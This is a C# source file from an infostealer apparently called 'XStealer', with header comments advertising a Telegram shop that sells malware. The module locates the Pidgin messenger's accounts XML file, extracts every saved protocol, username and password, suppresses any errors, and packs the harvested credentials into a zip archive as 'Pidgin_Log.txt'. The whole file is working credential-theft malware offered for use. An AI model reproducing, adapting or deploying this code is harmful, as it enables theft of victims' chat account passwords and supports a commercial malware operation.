// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Apps
{
    using System;
    using System.IO;
    using System.Xml;
    using Helpers;

    public static class Pidgin
    {
        public static void Inizialize()
        {
            using var ms = new MemoryStream { Position = 0 };
            if (File.Exists(GlobalPaths.PidPurple))
            {
                try
                {
                    using TextReader tr = new StreamReader(GlobalPaths.PidPurple);
                    using var rd = new XmlTextReader(tr) { DtdProcessing = DtdProcessing.Prohibit };
                    var xs = new XmlDocument() { XmlResolver = null };
                    xs.Load(rd);
                    using var data = new StreamWriter(ms);
                    foreach (XmlNode nl in xs.DocumentElement.ChildNodes)
                    {
                        XmlNodeList il = nl.ChildNodes;
                        data.WriteLine($"Protocol: {il[0].InnerText}");
                        data.WriteLine($"UserName: {il[1].InnerText}");
                        data.WriteLine($"Password: {il[2].InnerText}\r\n");
                    }
                    data.Flush();
                }
                catch (Exception) { }
            }
            ZipEx.AddKeyPairStream("Pidgin_Log.txt", ms?.ToArray() ?? ms.GetBuffer() ?? null);
        }
    }
}